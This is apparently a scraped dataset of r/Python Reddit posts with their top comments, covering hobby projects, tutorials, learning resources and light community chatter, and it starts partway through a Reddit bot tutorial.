We are almost done here. We wrap our functions into a `main` function by calling `authenticate()` (remember Section 1) and passing it to the function which runs the bot, namely `run_explainbot(reddit)`. Since we are calling it inside `while` loop with the expression 'True', it will run indefinitely.


#My bot in action


Test post to show the bot in action: https://redd.it/6tey71 (Since I'm not running it continuously as of now, it won't reply to every comment containing an xkcd link there)

My Terminal emulator while running the bot: http://imgur.com/4TzEyor


**Finally, if you want to take this project further, you are welcome to contribute code to [my Github repository](https://github.com/aydwi/explainxkcdbot). You can fork it (please note that there are still some checks to be added in order to make the bot more Reddit friendly) or open a pull request.** I'll try to add more details about file handling and scraping aspects of the program once I get some time. 
","PLEASE: For all people looking to make a bot, please read bottiquette! https://www.reddit.com/wiki/bottiquette"
"Congratulations, we are (a bit) over 300K",a4m9ul,2018-12-10 00:42:54,,"Having subbed around 3 hours ago, I feel somewhat proud."
Monitor your internet with python,jhh8oa,2020-10-25 05:35:26,,"For anyone using this code, please add some form of delay between loop iterations."
First thing I made on Python! Just a free fall simulator where you can choose the height and acceleration,exx72v,2020-02-03 07:11:31,,Nice. Which module did you use for the graphics?
How to create a Discord bot with Python: Part 1 (Setting up),li4ky3,2021-02-12 13:30:33,,Hmm. Just thought about creating a discord bot. Are you spying on me?
TechCrunch | Python 4 To Be Renamed to Viper And Introduce TypeScript support,128eq5o,2023-04-01 15:29:21,,hah! no way I'm falling for this
Python 3.9: All You need to know 👊,it4x8o,2020-09-15 16:41:17,,"> PEP 616, String methods to remove prefixes and suffixes

This is the big feature right here."
I started learning python about a month ago. Today I sat down and decided that I wanted to create tictactoe. And thats what I did. Felt so good when it all came together.,d2c4rf,2019-09-11 02:39:49,,"I spent about 5 hours making one. 
At the end I was so happy and showed it to my dad and he didn’t seem that impressed. 
BUT I WAS :)"
My nephew got his first Raspberry Pi today :),8tkgr5,2018-06-25 04:05:33,,"And so begins years of ""expected an indent"""
PYTHON CHARTS: the Python data visualization site with more than 500 different charts with reproducible code and color tools,y6fumv,2022-10-18 00:39:13,"Link: [https://python-charts.com/](https://python-charts.com/)  
Link (spanish version): [https://python-charts.com/es/](https://python-charts.com/es/)  


This site provides tutorials divided into chart types and graphic libraries:

https://preview.redd.it/6yk59rxp8eu91.png?width=748&format=png&auto=webp&s=0581694dcacd8d7e9e7909b2c13dd0b76f7bd64c

&#x200B;

The graphs can be filtered based on the library or chart type:

&#x200B;

https://preview.redd.it/dyo2btgz8eu91.png?width=1058&format=png&auto=webp&s=a22b43408411950c2351367a96e871279f368acc

&#x200B;

Each post contains detailed instructions about how to create and customize each chart. All the examples provide reproducible code and can be copied with a single click:

https://preview.redd.it/d681tn319eu91.png?width=1553&format=png&auto=webp&s=05fd21d7a896082753c55cec461df67460ee07fb

&#x200B;

The site also provides a color tool which allows copying the named, colors or its HEX reference:  


&#x200B;

https://preview.redd.it/ptwelwb99eu91.png?width=1299&format=png&auto=webp&s=54bc17e012790a55d62604f1d8a5fcb6565ab381

  
There is also a quick search feature which allows looking for charts:  


&#x200B;

https://preview.redd.it/gpoz93wd9eu91.png?width=1013&format=png&auto=webp&s=fa3af72c6b2ef43444278e74032a0ebae3d9c143

  
Hope you like it!",That's cool man. I do like it.
Started learning Python a few months ago...today I finished my first game from scratch using Pygame!,ermgjg,2020-01-21 08:22:22,,GitHub Link: [https://github.com/kevinfreyberg/galactiblock](https://github.com/kevinfreyberg/galactiblock)
"I’m developing a programming game where you use Python to automate all kinds of machines, robots, drones and more and solve exciting bite-sized coding challenges.",10qv40g,2023-02-01 21:46:48,"Six weeks ago, I announced JOY OF PROGRAMMING here on r/python and it was met with an overwhelmingly positive reception and a lot of valuable feedback. In case you missed it, the game is all about practicing and applying your Python skills to challenging tasks in realistic, physically simulated 3D environments. It will cover a wide variety of topics, from basic algo / ds, oop, GUI programming to control theory, robotics, image processing, machine learning, genetic algorithms, and more. Of course it will also include a basic tutorial for beginners, but I plan to include interesting challenges for all skill levels. In my day job I’m a CS professor, and this game actually started out as a tool I used in-class for my students. For the last 19 months I’ve been developing this prototype into a proper game.

Speaking of development, in these last 6 weeks I added a lot of new features, polished and cleaned up many things, and improved the API documentation and made everything fully pep8 compliant. Also I finally got around to recording a longer gameplay trailer, which is hot off the press and I’d like to share it with you. Please head over to the game’s Steam page where you can check it out (it’s the second video there, though I recommend watching the first teaser if you haven’t already).

[https://store.steampowered.com/app/2216770/JOY\_OF\_PROGRAMMING\_\_Software\_Engineering\_Simulator](https://store.steampowered.com/app/2216770/JOY_OF_PROGRAMMING__Software_Engineering_Simulator) 

I’m very much looking forward to your feedback or your questions, and of course if you have a Steam account and you like what you see, consider a wishlist. This really helps to “feed” Steam’s recommender algorithm to spread the word about JOY OF PROGRAMMING and hopefully getting more people into Python programming that way!",Do you already have a release date in mind? I added the game to my wishlist after you posted it the first time on this sub.
"Im making a video editor in Python. Yes, i'm crazy. No, it wont lag",xxrs6j,2022-10-07 14:32:07,"# NEW POST.
https://www.reddit.com/r/Python/comments/101hu89/i_am_still_making_a_video_editor_in_python_i_am/?utm_source=share&utm_medium=android_app&utm_name=androidcss&utm_term=1&utm_content=share_button

# Motive

I am making a video editor in Python due to a lack of free editors who have the features i want them to have, without needing a super beefy computer to run, I'm talking: keyframes, 3d animations, etc.

This was a spontaneus decision by me because a malaysian friend was forced to use kinemaster because his pcs have no more than a core 2 duo.

Why wont i use something else?

Because python is really easy to just get stuff working without making a ton of bullsh** boilerplate just to move an image in 3d or paste and image on top of another.

# The backstory

There is a genre of videos called ""crazy errors"" they were quite popular back in 2011-2014, they involve error messages popping up in rythm to music, making it look like a virus (the video itself was most commonly made in a video editor like premiere or vegas pro). It most commonly featured IOSYS's ""Marisa Stole the Precious Thing"", although other songs could appear too.


It was near the end of 2020, back then I found out that windows93.net has a crazy error program. The difference is, is that the errors that popup, are actually interactive and are real windows in the os. This blew my mind and i immediately needed to know how it worked.

Turns out, they used a MIDI for sequencing the errors! Each note did something, either open an error, clear the screen, show a bsod, etc. This blew my mind(Again!), because a midi is the perfect method for doing this.
DAWs support it, and whats better for syncing events to audio than a piano roll in a DAW?

I used that method for my first crazy error, it opened real windows on your computer and was quite resource intensive.

Uploaded it to Youtube, gained 340 subs, 35k views, etc etc, May of 2021 comes in and i want to do something different. I want to do a 100 sub special, but this time, a different OS.

""A different OS? How? You would have to get a vm! And even then, it cant be older than Windows 7!""

But what if the errors were fake?

What if they were just images that appeared on the screen?

Thats what i did. I learned PIL, made the special, it was only one type of error, but it taught me a lot.


The program saved each frame to a png, and then i had to use ffmpeg to generate a mp4 out of them.

After that i made a 3D one, and it was fake Windows 7 errors, but animated. Had to make an entire window system for that one, each error was an element in a list, holding info about the current animation frame, position, images, etc.

After that i made a Windows XP crazy error, which had a better version of the window system and was filled to the brim with moving windows, spamming, and a gun!

Then, i made an entire error generator! Which is extremely accurate and will be part of the editor. It even works on py-script! [relt-1.github.io/app/](https://relt-1.github.io/app/)  play with it!

And that brings us to the present, where i had a vision, of a huge 10 minute medley, with all the songs and oses, a tribute to the genre.
While i was making that, i got the idea for a crazy error maker, with the error generator built in. I thought to myself: ""If im making a crazy error editor, i might just make the tribute in it! To showcase the power of the program!""

# The how

Im using PIL for generating the frames. Pygame to display the playback. And tkinter for UI.

The timeline is rendered with PIL too!, a lot easier to manage an image than to use ui elements.

I use ""Keyframes"" for the error sequencing, currently theres only one keyframe type, but in the future, there will be a lot more of them, and even a 2d timeline!


Lets get real, Python is slow. But what isnt slow, is dictionary access.
If i can convey all the opened errors before the cursor in a string, i could save that in a dict, and then access it later instead of computing the frame all over again.

Coding in Python is like coding a C128, you'll feel awesome, until you have to optimize.

And if you wont optimize, you might aswell not code either.

I optimized it HARD. 60 fps playback even on crappy pcs. Thats what i mean.

Not only that, but the program features:

* WAV markers (USE THEM PLEASE THEY ARE IN FL STUDIO AND REAPER)

* BPM snapping

* Custom errors/images, you can already make some sh**posts with it!

* Custom animations. Did i mention the program has superaccurate windows 7 animations with data taken directly from the code? 3d Position, Rotation, and Pivot point.

* Aero blur.

* Background image

* Presets

* Automatic inactive windows


I am adding more features every day, which brings me to the

# Future of the project

I want this program to be a full on video editor. With video clips, text generator, special effects, and even some audio processing!

But before that, i have to complete the crazy error part.
Things to do:

* More oses

* Balloons

* UAC window

* Compositing manager (will make caching a lot faster)

* Closing windows (harder than it sounds actually)

* Layers

* Desktop generation

* probably even more.


# Videos

The project is in an early state. Everything is subject to change

WAV marker showcase
https://media.discordapp.net/attachments/1022791896067735602/1025732640080408626/2022-10-01_13-34-26.mp4

early custom animation
https://media.discordapp.net/attachments/1022791896067735602/1026538677532368936/pythonw_OpY2DRj1Wa.mp4

A small preview made in the program
https://media.discordapp.net/attachments/742311461631819786/1027499039249403934/a.mp4

More videos coming soon!

# I need your help!

I wouldnt call myself a pro at Python, thats why i need YOUR help! I doubt i'll finish this project just by myself. If you are interested and know anything about moviepy, kivy, pygame, pillow, etc. Please DM me on reddit or discord (Relt#4423), we can discuss.

# Download?

Here is the current source code:
https://github.com/relt-1/czeditor

# TL DR
I made a video editor for crazy error videos, but now i want it to be larger in scope.",You need to github that thing so others can follow the dev process
Python running without an OS!,phz9a2,2021-09-05 04:42:15,,Holy shit! This guy's taking Python off the grid! This guy doesn't have an operating system for Python!
"Used Python to build a r/wallstreetbets sentiment analyzing algo-trader (I used VADER sentiment analysis) -- 33% annual return ($16k). Source code, pictures, and results!",nmdy7n,2021-05-28 02:24:25,"[Source code](https://github.com/tstewart161/Reddit_Sentiment_Trader)

[Hosted version](https://getquantbase.com) (how to actually run/invest in it). Folks the amount of y’all that have messaged me asking for this is absolutely AMAZING but I can’t keep up! Posting the link here for you guys

&#x200B;

HOW I DID THIS

Scraped WSB sentiment, got the top + most positively mentioned stocks on WSB (for the better part of this year, that's been $GME and $AMC, recently some $SPCE and $NVDA, and about 13 other stocks. I have the strategy rebalancing monthly. The source code is actually pretty intuitive, but essentially what it uses is VADER ( Valence Aware Dictionary for Sentiment Reasoning), which s a model used for text sentiment analysis that is sensitive to both polarity (positive/negative) and intensity (strength) of emotion.

The way it works is by relying on a dictionary that maps lexical (aka word-based) features to emotion intensities -- these are known as sentiment scores. The overall sentiment score of a comment/post is achieved by summing up the intensity of each word in the text.

In some ways, it's easy: words like ‘love’, ‘enjoy’, ‘happy’, ‘like’ all convey a positive sentiment. Also VADER is smart enough to understand the basic context of these words, such as “did not love” as a negative statement. It also understands the emphasis of capitalization and punctuation, such as “ENJOY” which is pretty cool. Phrases like “The acting was good , but the movie could have been better” have sentiments in both polarities, which makes this kind of analysis tricky -- essentially w VADER you would analyze which part of the sentiment here is more intense.

&#x200B;

**Results and some stats:**

Right now I'm up 60% YTD, compared to the SP500's 13% (the recent spikes in GME and AMC have helped tremendously)

\- The strategy is **backtested** only to the beginning of 2020, but I'm working on it. It's got an annualized return of 33% (compared to 16% for the SP500)

\- **Max drawdown of -8.7%** (aka how far it went down before coming back up -- interestingly enough, WallStreetBets weathered COVID pretty well)

&#x200B;

Happy to answer any more questions about the process/results. I think doing stuff like this is pretty cool as someone with a foot in algo trading and traditional financial markets",Does it detect emojis like 🚀?
From complete beginner to django website,kcdfv0,2020-12-14 00:25:40,"6 months ago I’d never written a single line of code, in any language. I decided completely out of the blue to do a course on “coding for data analysis”, I very nearly picked one on human biology instead. It was just something to fill the lockdown boredom, but I quickly and unexpectedly started to enjoy it more and more.

Fast forward 3 months and I started learning html and then django. From that the idea to create www.rugbykickoff.com, which has just gone live now. 

I honestly can’t believe how quickly it was to pick the language up with the amount of help available online. 

I lost motivation several times getting completely lost at stack overflow answers where I didn’t understand a single concept etc. But this is testament to persevering and the massive amount of online support that’s available. 

To anyone in the same boat, don’t give up!","Looks great! Great job of using Bootstrap to make it look good! It took me 2 years to just start using Flask! If you are looking for ways to improve your site, perhaps use a collapsable navbar and put the dropdowns in it? - [https://getbootstrap.com/docs/4.0/components/navbar](https://getbootstrap.com/docs/4.0/components/navbar/) \- notice how it has inline dropdowns but when you go on mobile (or resize the window), it creates a 3 bars collapsable animation thing. Great work, keep it going!"
I took some suggestions and improved my solar system generator with better rings and colorful stars,d8t3fu,2019-09-25 04:40:19,,"This looks a lot like the Godspeed desk mats: https://novelkeys.xyz/products/godspeed-deskpads

Edit: hah just saw your GitHub readme. Nice."
Unpopular opinion: Matplotlib is a bad library,u8j6fn,2022-04-21 17:00:38,"I work with data using Python a lot. Sometimes, I need to do some visualizations.  Sadly, matplotlib is the de-facto standard for visualization. The API of this library is a pain in the ass to work with. I know there are things like Seaborn which make the experience less shitty, but that's only a partial solution and isn't always easily available. Historically, it was built to imitate then-popular Matlab. But I don't like Matlab either and consider it's API and plotting capabilities very inferior to e.g. Wolfram Mathematica. Plus trying to port the already awkward Matlab API to Python made the whole thing double awkward, the whole library overall does not feel very Pythonic.

Please give a me better plotting libary that works seemlessly with Jupyter!","It depends on what you need to do.

Do you want an easy of the box way to just say ""give me a scatter plot that's not ugly by default"" then Seaborn or Plotly.

Do you want full, precise control of everything at the price of no hand holding on style (you're going to change all the defaults anyway so it doesn't matter they start as), then Matplotlib is probably your only choice.

If you want full control for  web based/JavaScript adaptive figures, then Plotly. I've known some people who have tried to make Plotly work for static figures, but since that's not what it's made for it can be difficult, and you're probably better off with Matplotlib.

In the end it comes back to the eternal tradeoff between easy out of the box and full flexibility."
"I wrote a small library to enable flexible piping in Python, and finally happy with my live rendering setup in vim. Figured I'd make a small demo.",evolio,2020-01-29 23:48:35,,"What kind of terminal is that?

i.e. how do I get in-line Errors on the right hand side?"
The interactive python mode in VSCode is amazing,i5dns2,2020-08-07 21:19:40,,I've been using VSC for a year now and I would not swap it for any other IDE. Another great thing about it are the endless markeplace extensions which you can use to extend functionality and the fact that it gets updated with new features and bug fixes regularly.
You can insert Emoji using `\N{NAME_OF_EMOJI}`,qy4iym,2021-11-20 20:22:49,,Neat. Can't wait to litter my work project with emojis now
Suitable tattoo,beiazl,2019-04-18 14:28:30,,It looks too far left on his arm. It needs to be indented another two spaces
Best Python Cheatsheet Ever!,an0kya,2019-02-04 18:54:56,,You should share it here also r/learnpython many people we like it too 
Created a click bot after reading Automate boring stuff :),c1zx5f,2019-06-18 17:03:52,,"Reported for botting

🦀🦀🦀🦀🦀🦀"
Realised Ive spent 10 hrs learning to automate a job that takes me 15 minutes a week,13s7h2m,2023-05-26 16:37:43,"And Im only half way through. 

worth_it = True 


Yes Im a noob","""We do these things not because they are easy, but because we thought they were going to be easy."""
"Making €6,147,455 Overnight in in-game currency using Computer Vision",z8qstu,2022-11-30 20:56:01,"# A Python bot used to play the game 'City Island'

Gameplay:

https://reddit.com/link/z8qstu/video/596siu9n533a1/player

[For example: Closing a popup](https://i.redd.it/tdeex2b3333a1.gif)

# Why?

I've been playing strategy + city building + simulation? games like **TownsMen 6**, **Clash of the Clans**, and SimCity for the last 10 years.

On trying out **City Island 5** I found it mildly irritating that my collectables could not accumulate while I was outside the game. I might have had the best businesses, strategy, etc but I had to be in the game to ensure I collect the cash/keys/gold over time. For example, if my bakery makes €100 per minute I would only earn €100 after leaving the game and coming back 24 hours later.

This became especially tiresome while trying to accumulate €5,000,000 required to buy the island shown below. This would take me roughly two weeks of gameplay if I don't spend any money - it's not worth it.

&#x200B;

[Island I wanted to buy](https://preview.redd.it/6x6t11ig333a1.png?width=1990&format=png&auto=webp&s=a836a96daa48ab5649edcfef8eb94baf5a2d4738)

&#x200B;

This is a problem that can be solved using one of the greatest tools in my tool belt - programming.

I decided to create a Python bot used to play the game using computer vision and image processing techniques. The bot should be able to play the game without any human intervention.

\---

# Results after running overnight

I started the game with €316,415:

https://preview.redd.it/he8i7q9y433a1.png?width=3360&format=png&auto=webp&s=b809f95311c59055abcc267841a94eb5a79882d9

The following morning I had €6,463,870:

https://preview.redd.it/t1w46e9d433a1.png?width=3360&format=png&auto=webp&s=4e8f9b901bd85897220e5f67d5bfdb1f6263e33c

I made €6,147,455 overnight!

I then proceeded to buy the Island I wanted:

https://preview.redd.it/h4fd7ehf433a1.png?width=3360&format=png&auto=webp&s=aefc5ce2c53d4395f4b871752b5a6df901ef689f

# Source code & guide

A basic guide on how I achieved it - [https://paulonteri.com/thoughts/play-game-with-computer-vision](https://paulonteri.com/thoughts/play-game-with-computer-vision)

Source code - [https://github.com/paulonteri/play-game-with-computer-vision](https://github.com/paulonteri/play-game-with-computer-vision)","Not going to lie, I missed the “in-game currency” part of the title and got excited lol"
willmcgugan/rich Rich is a Python library for rich text and beautiful formatting in the terminal.,kcyg3o,2020-12-14 22:18:27,,Author of Rich here. Thanks for the kind words. AMA
I made a script to automatically log into my zoom meetings and record it.,fyvt4l,2020-04-11 11:44:29,,I’ve also made a script to automatically log into your Zoom meetings and record them.
Free Python Learning Resource Provided by Microsoft,ns8gba,2021-06-04 23:56:27,"Came across this platform today called [Microsoft Learn](https://docs.microsoft.com/en-us/learn/), which provides free training to learn different skills related to different technologies. Each course is designed as a module, in each module, it contains different lessons and exercises. Below are the modules related to Python learning.

# Beginners Courses

* [What is Python?](https://docs.microsoft.com/en-us/learn/modules/python-introduction/)
* [Take your first steps with Python](https://docs.microsoft.com/en-us/learn/paths/python-first-steps/)
* [Set up your Python beginner development environment with Visual Studio Code](https://docs.microsoft.com/en-us/learn/modules/python-install-vscode/)
* [Introduction to Python](https://docs.microsoft.com/en-us/learn/modules/intro-to-python/)
* [Branch code execution with the if...elif...else statement in Python](https://docs.microsoft.com/en-us/learn/modules/python-if-elif-else/)
* [Manipulate and format string data for display in Python](https://docs.microsoft.com/en-us/learn/modules/python-format-strings/)
* [Perform mathematical operations on numeric data in Python](https://docs.microsoft.com/en-us/learn/modules/python-datatypes-numeric-operations/)
* [Iterate through code blocks by using the while statement](https://docs.microsoft.com/en-us/learn/modules/python-while/)
* [Import standard library modules to add features to Python programs](https://docs.microsoft.com/en-us/learn/modules/python-standard-library/)
* [Create reusable functionality with functions in Python](https://docs.microsoft.com/en-us/learn/modules/python-functions/)
* [Manage a sequence of data by using Python lists](https://docs.microsoft.com/en-us/learn/modules/python-lists/)
* [Write basic Python in Notebooks](https://docs.microsoft.com/en-us/learn/modules/basic-python-nasa/)
* [Count the number of Moon rocks by type using Python](https://docs.microsoft.com/en-us/learn/modules/count-moon-rocks-python-nasa/)
* [Code control statements in Python](https://docs.microsoft.com/en-us/learn/modules/intermediate-python-nasa/)
* [Introduction to Python for space exploration](https://docs.microsoft.com/en-us/learn/modules/introduction-python-nasa/)
* [Install coding tools for Python development](https://docs.microsoft.com/en-us/learn/modules/install-code-tools-python-nasa/)
* [Discover the role of Python in space exploration](https://docs.microsoft.com/en-us/learn/paths/introduction-python-space-exploration-nasa/)
* [Crack the code and reveal a secret with Python and Visual Studio Code](https://docs.microsoft.com/en-us/learn/modules/secret-message/)
* [Introduction to object-oriented programming with Python](https://docs.microsoft.com/en-us/learn/modules/python-object-oriented-programming/)
* [Use Python basics to solve mysteries and find answers](https://docs.microsoft.com/en-us/learn/paths/python-partnership/)
* [Predict meteor showers by using Python and Visual Studio Code](https://docs.microsoft.com/en-us/learn/modules/predict-meteor-showers-using-python/)
* [Plan a Moon mission by using Python panda](https://docs.microsoft.com/en-us/learn/modules/plan-moon-mission-using-python-pandas/)

# Intermediate Courses

* [Create machine learning models](https://docs.microsoft.com/en-us/learn/paths/create-machine-learn-models/)
* [Explore and analyze data with Python](https://docs.microsoft.com/en-us/learn/modules/explore-analyze-data-with-python/)
* [Build an AI web app by using Python and Flask](https://docs.microsoft.com/en-us/learn/modules/python-flask-build-ai-web-app/)
* [Get started with Django](https://docs.microsoft.com/en-us/learn/modules/django-get-started/)
* [Architect full-stack applications and automate deployments with GitHub](https://docs.microsoft.com/en-us/learn/modules/automate-deployments-github-actions-azure/)","Nice find, OP!

Might want to cross-post in r/learnpython as well."
I have simulated ray-tracing in pygame! You can check it out here: https://github.com/kubapilch/Ray-Tracing,d6v523,2019-09-20 21:45:43,,Doesn't ray-tracing also include reflections?
A list of 30 Python language tricks,la04qd,2021-02-01 18:23:56,"I wrote this article, [30 Python Language Tricks](https://medium.com/pythonland/30-python-language-tricks-that-will-make-you-a-better-coder-f08f811a7b0f?sk=f140c6aa3a21d4f39065ca3827836456), on Medium. it's a ""friend link"" which bypasses the paywall. It contains a wide selection of topics, for both beginners and more advanced level programmers. Enjoy and let me know if you liked it!","I think #7 should be replaced by f-strings. And if you like formatting tricks, there’s a whole webpage about it: [https://pyformat.info/](https://pyformat.info/)"
Xpost from Woodworking,a8g2ne,2018-12-22 08:25:26,,`print(random.choice(action))`
I made GUI based app which lets you create and train simple feed forward neural networks.,fcawh0,2020-03-02 19:47:34,,"Here's the [Source Code](https://github.com/imdeep2905/Neural-Network-Sandbox).

Any feedback is much appreciated

P.S.

I was trying to convert this project into single executable file.But I can't get it working. So if anyone have expertise in that domain ping me. It would be of really great help."
"NumPy receives first ever funding, thanks to Moore Foundation",6h2g42,2017-06-14 04:01:40,,That's Lot of money.  I don't see any any info about what they're planning to do with it.  Any other links?
CIA uses Python (a lot),5y2boe,2017-03-08 02:21:32,"From the latest [Vault 7 leaks](https://wikileaks.org/ciav7p1/cms/index.html) from Wikileaks, we can see that CIA uses a lot of Python in its secret hacking tools.

Most notably in the Assassin, Caterpillar, MagicViking and Hornet projects.

Unfortunatelly, no files from these projects have been released yet. But if you look at the dump that was released, there are plenty of .py files, and even PIL is included.

There are even Coding Conventions: https://wikileaks.org/ciav7p1/cms/page_26607631.html

You can see more Python-related stuff here: https://search.wikileaks.org/?query=python&exact_phrase=&any_of=&exclude_words=&document_date_start=&document_date_end=&released_date_start=&released_date_end=&publication_type%5B%5D=51&new_search=False&order_by=most_relevant#results",">**Global Variables**    
Avoid global variables.

Thank you CIA. "
Let's make a Simple Voice Assistant like J.A.R.V.I.S using Python [for Beginners & Intermediates],jrkseu,2020-11-10 21:19:00,"Hey guys, I'm back with another interesting tutorial. In this tutorial, you will learn how to build your own personal voice assistant like Jarvis using Python.

You can find the complete tutorial here on my blog - [https://thecodingpie.com/post/how-to-build-your-own-python-voice-assistant-thecodingpie/](https://thecodingpie.com/post/how-to-build-your-own-python-voice-assistant-thecodingpie/)

I hope you will love it. I tried my best to make this tutorial fun and beginner-friendly. So fear not! If you got stuck, I am always here to help you :) As always, any feedback is accepted...",Checking it out now - really appreciate you doing this type of stuff. It helps so much!
Playing Space Invades created in pygame with hand gestures using OpenCV and CNNs,h0su23,2020-06-11 13:25:05,,"It looks so cool man  
please can you share your source code?"
I made metaballs. Works quite fast. https://github.com/Norne9/metaballs,eq30cd,2020-01-18 00:56:01,,https://github.com/Norne9/metaballs for those who are lazy like me
I wrote a Python script to generate your personal YouTube report.,edpvnh,2019-12-21 21:24:28,,"Source code and instructions: [https://github.com/A3M4/Personal-YouTube-PDF-Report-Generator](https://github.com/A3M4/Personal-YouTube-PDF-Report-Generator)

Edit：Data from  [https://takeout.google.com/](https://takeout.google.com/)"
My little project,cuhsmc,2019-08-24 02:24:33,,"I will never stop being amazed at people who can write software, but can't figure out how to record videos.

Like, they're sitting in front of a computer that they just bent to their will, and thinking ""If only I had something that could record this"", and then they reach for their phone."
I made a web app to convert baking recipes from volume to weight,g0mmbt,2020-04-14 00:45:09,,Nice! Heads up on dry ingredient conversions; the conversion that works for one type may not work for another. The best example I can give is with salt. Your site considers 1 tsp of sea salt to be the same weight as 1 tsp of table salt. The result is that recipes calling for corser salts will be under-salted after the conversion.
What stuff did you automate that saved you a bunch of time?,hth0qs,2020-07-18 21:58:00,"I just started my python automation journey. 

Looking for some inspiration.

Edit: Omg this blew up! Thank you very much everyone. I have been able to pick up a bunch of ideas that I am very interested to work on :)","I'm quite new as well, so my code is really not very sophisticated. I'm currently working on transcribing some interviews, and I wrote a code to start each line I type with Interviewer >> or Guest >>. After I'm done typing what one of them says, I press Enter and it switches. I can also add time stamps for the interview. It tracks how long I've worked and how much of the interview is transcribed."
"Tower defense project - in game Dev view, random path offsets, animated towers and mobs - collectable with mouse/seeking coins - My first proper bespoke project (Pygame)",gerasc,2020-05-07 03:59:46,,"My first actual project after doing the general tic tac toe text game, adventure style text game followed by a project where i recreated the pokeon battle encounter screen (which helped a lot for learning blitting orders/ surfaces and rects etc)

game has random mob offset that alternates each path turn ( so mobs travel the same distance and don't always turn early if they start with that offset) - took a while to perfect this.

mob shadows for visual effect

tower animation and different image parts to each tower

started as a pygame shape tower defense in the early stages while i got the basics in then i gradually added graphics from free sprite sources. (craftpix and others)

used tiled for basic level creation with additional functionality to help map out my path etc.

planning bottom status screen and tower build side menu. (currently just using ""t"" to pick a tower) as well as adding features as i go along. currently a project i spend an hour or 2 on when i get the free time.

let me know what you think and if you have any ideas/criticisms I can take into account.

&#x200B;

\*UPDATE 1: code: [https://github.com/RichFox1990/Fox-Tower-Defense](https://github.com/RichFox1990/Fox-Tower-Defense)

UPDATE 2: added simple menu, skip to next wave and auto commence wave after 60 sec. New upgrade menu and tower construction menu. Various other tweaks and now committed all the relevant files so you can all clone play the game of required (not I haven't added that many waves so once it reaches the end it will exot put currently. You can easily add more though in the main.py if you like.  [https://github.com/RichFox1990/Fox-Tower-Defense](https://github.com/RichFox1990/Fox-Tower-Defense) 

let me know what you think"
Yury Selivanov on Twitter: Python 3.10 will be up to 10% faster,jeu0xq,2020-10-21 01:18:23,,"Here the best explaination I found from [here](https://mail.python.org/pipermail/python-dev/2016-January/142945.html)
> Let's look at this function:
>  
>      def spam():  
>          print(ham)
> 
> Here are its opcodes:
> 
>                0 LOAD_GLOBAL              0 (print)  
>                3 LOAD_GLOBAL              1 (ham)  
>                6 CALL_FUNCTION            1 (1 positional, 0 keyword pair)  
>                9 POP_TOP  
>               10 LOAD_CONST               0 (None)  
>               13 RETURN_VALUE  
> 
> The opcodes we want to optimize are LOAD_GLOBAL, 0 and 3.  Let's look at 
> the first one, that loads the 'print' function from builtins.  The 
> opcode knows the following bits of information:
> 
> - its offset (0),
> - its argument (0 -> 'print'),
> - its type (LOAD_GLOBAL).
> 
> And these bits of information will *never* change.  So if this opcode 
> could resolve the 'print' name (from globals or builtins, likely the 
> latter) and save the pointer to it somewhere, along with 
> globals->ma_version and builtins->ma_version, it could, on its second 
> call, just load this cached info back, check that the globals and 
> builtins dict haven't changed and push the cached ref to the stack.  
> That would save it from doing two dict lookups.

This is not the explaination for this patch (LOAD_ATTR caching), but the idea stays the same"
"My trailer was stolen late last week, so I wrote a Craigslist scraper so I can see if anyone tries to sell it. (With repo link)",n3a6ie,2021-05-03 00:34:42,"I was beyond livid when I found my trailer was stolen, so I did the only thing I could do, outside of waiting for the police to find something... I wrote this scraper.

[CLAPI](https://github.com/Absolute-Tinkerer/CLAPI)

It's pretty basic right now since I wanted something quick. My use case is primarily through the viewer, but I'm sure there are other applications.","That's a 5 star business idea btw. Customers with stolen items can subscribe to the service and get alerted if it shows up on craigslist, ebay etc. Business model could be that the customer get a refund if item won't be found in x months."
Free Python for Data Analytics Course,ifukmz,2020-08-25 02:21:25,"Hi,

I  am a self-taught Analytics professional from a small town in India. I  am a long time lurker here on Reddit and I finally have something to  share with this community.

I have  extensive experience in Python and Machine Learning working in companies  like Citi Bank and Flipkart (a Walmart's subsidiary in India). I have  created a small Python course all inside Jupyter Notebook. All you need  to do is to import the notebook files and you can learn the topics and  run the codes - all inside the notebook file itself. I believe that  these notebooks will be more than enough for you to get started in  Python and you might not need to do any other basic Python course  online.

Jupyter Notebook files are available [here](https://github.com/ItsAwSM/Python-for-Data-Analytics).

I also have created videos on the notebooks if you need any added explanation. They are on my channel [here](https://www.youtube.com/c/UtsavAwasthiX/videos)

|| ज्ञानं परमं बलम् ||

(knowledge is power supreme)

&#x200B;

Edit: Thank You for overwhelming response. I will comment from my alternate account. u/flipkartamazon, keeping main for personal use. Thank you all for upvotes and awards.",You really dedicated time to make these tutorials all over an hour. Thanks for the extra learning resources!
Super Potato Bruh is now on Steam! - Made in pure Python & Pygame - Source code on itch.io!,9pu15b,2018-10-20 21:14:00,,this is awesome! may I ask for an explanation on how you handled collisions so well?
Created a webapp that displays the bond-line structure of any chemical compound/molecule.,bd355n,2019-04-14 22:14:09,,Tungsten Dioxide
The Self-Taught Programmer (For Python) Udemy Course is Free (I think only for today),lwpofb,2021-03-03 17:17:51,"Just came across the information from a friend of mine that The Self-Taught Programming Udemy course is free today (with free coupon code). Course is rated 4.6/5, so I think it is pretty solid.

[Udmey Course Link](https://www.udemy.com/course/self-taught-programmer/?couponCode=0A41815BD0D750D1595D) (Coupon is already applied)",You made my day I'm 16 and I was saving for it
Made a reaction time game for my first pygame project.,fjemrj,2020-03-16 11:52:44,,"It takes into consideration the distance from one rectangle to another? I mean for the score (great, legendary...)"
An Interactive Cheat Sheet That Just Gives You The Answer,t7zbbc,2022-03-06 22:00:02,"After realizing I was spending way too much time looking for answers instead of coding. Thinking there must be a better way but not finding what I want, I created this...

The Python SpeedSheet: https://speedsheet.io/s/python

This is an interactive cheat sheet. It is a simple idea, just type what you want into the search bar and it displays the answer.

This sheet covers the core Python language. The sheet has doubled in size since I first posted about it last year and the search has been improved. It is definitely not perfect and I'm sure it is still lacking some important features but I personally find it incredibly useful.

Here is a video on how it works:

https://www.youtube.com/watch?v=66RumAF50_4

TLDR:

This is an interactive cheat sheet for Python.","I use this a lot and it is great. I would love pandas in there as well, but I am being a little selfish 😁 

Again, great job with this as it is very helpful!"
10+ Year CS Teacher here. What I'm doing and why I'm doing it,m6a268,2021-03-16 22:17:00,"So, here's what I'm doing and why I'm doing it.

I've been a high school Computer Science teacher for over 10 years (like 11ish but who's counting at this point...)

